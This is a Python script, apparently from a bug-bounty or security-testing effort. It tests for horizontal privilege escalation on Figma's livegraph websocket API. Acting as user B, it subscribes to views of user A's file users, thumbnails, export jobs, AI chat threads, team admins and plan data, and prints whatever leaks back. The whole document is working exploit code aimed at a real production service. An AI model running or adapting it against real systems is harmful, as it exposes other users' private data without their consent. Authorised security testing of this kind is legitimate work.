# -*- coding: utf-8 -*-
"""livegraph 横向越权批量测试 v1:B 身份订阅 A 资源
注册表结构:o("ViewName",[args],"viewHash") 已从主 bundle 提取
每个 view 独立连接:auth frame 带 userId=UID_B,B 身份
"""
import json, time, websocket, sys
sys.path.insert(0, 'D:/scan/figma_report')
from _figma_creds import UID_A, UID_B, FILE_A, FILE_B, TEAM_A, TEAM_B

CLIENT_URL = 'https://www.figma.com/file/%s' % FILE_A

# (viewName, args, label)
TESTS = [
    # --- 对照(应该成功,B 自己的资源) ---
    ('ActiveFileUsersForFileView', {'fileKey': FILE_B}, 'CONTROL B文件活跃用户'),
    ('PaginatedUserAiChatThreadsView', {'firstPageSize': 10, 'ownerId': UID_B, 'userId': UID_B}, 'CONTROL B自己的AI线程'),
    ('TeamByIdForPlanUserView', {'teamId': TEAM_B}, 'CONTROL B团队plan用户'),
    ('PlanByFileKey', {'fileKey': FILE_B}, 'CONTROL B文件plan'),
    # --- 测试:B 订阅 A 的资源 ---
    ('ActiveFileUsersForFileView', {'fileKey': FILE_A}, 'TEST A文件活跃用户(在线用户泄露)'),
    ('PageThumbnailsByFileKeyView', {'fileKey': FILE_A}, 'TEST A文件缩略图'),
    ('MediaExportJobsForFileView', {'fileKey': FILE_A}, 'TEST A文件导出任务'),
    ('PaginatedUserAiChatThreadsView', {'firstPageSize': 10, 'ownerId': UID_A, 'userId': UID_A}, 'TEST A的AI对话线程列表'),
    ('TeamByIdForPlanUserView', {'teamId': TEAM_A}, 'TEST A团队plan用户'),
    ('TeamByIdForPlanView', {'teamId': TEAM_A}, 'TEST A团队plan'),
    ('TeamAssociatedProfileUsersAdminsView', {'profileId': UID_A, 'teamId': TEAM_A}, 'TEST A团队管理员列表'),
    ('PlanByFileKey', {'fileKey': FILE_A}, 'TEST A文件plan(F1对照)'),
    ('FileMakeVersionsView', {'fileKey': FILE_A, 'firstPageSize': 10}, 'TEST A文件Make版本(F2对照)'),
]

def conn(view_name, args, label, userId):
    url = ('wss://www.figma.com/api/livegraph?pv=1&userId=%s&anonUserId=&clientType=web'
           '&preload=%%7B%%7D&requestedProtocolVersion=2&clientUrl=%s&connectionType=initial&reconnect=0'
           % (userId, CLIENT_URL))
    ws = websocket.create_connection(url, timeout=10, header=['User-Agent: Mozilla/5.0'])
    ws.send(json.dumps({'messageType': 'auth', 'clientType': 'web',
                        'args': {'userId': userId, 'anonymousUserId': None},
                        'tags': {'clientType': 'web', 'clientUrl': CLIENT_URL},
                        'clientRequestedVersion': 2}))
    time.sleep(0.4)
    ws.send(json.dumps({'messageType': 'subscribe', 'viewName': view_name,
                        'viewHash': 'abababababababababababababababab',
                        'loadType': 'initial', 'args': args}))
    msgs = []
    ws.settimeout(5)
    try:
        while True:
            msgs.append(ws.recv())
    except Exception:
        pass
    ws.close()
    # 分类
    status = '?'
    data_msgs = []
    for m in msgs:
        try:
            j = json.loads(m)
        except Exception:
            continue
        mt = j.get('messageType', '')
        if mt == 'viewSubscriptionFailed':
            status = 'FAIL:' + str(j.get('errorCode', ''))
        elif mt in ('viewSubscribed', 'subscriptionStatus', 'viewSubscriptionSucceeded'):
            status = 'SUBSCRIBED'
        elif mt == 'denormalizedPendingMutations' or 'data' in str(j)[:200]:
            data_msgs.append(m)
    if status == 'SUBSCRIBED' and data_msgs:
        status = 'DATA(%d)' % len(data_msgs)
    print('[%s] %s -> %s' % (status, label, view_name))
    for m in data_msgs[:2]:
        print('    %s' % m[:500].replace('\n', ' '))
    return status

print('========== B 身份(uid=%s)==========' % UID_B)
for vn, args, label in TESTS:
    try:
        conn(vn, args, label, UID_B)
    except Exception as e:
        print('[ERR] %s %s: %s' % (label, vn, e))
    print()
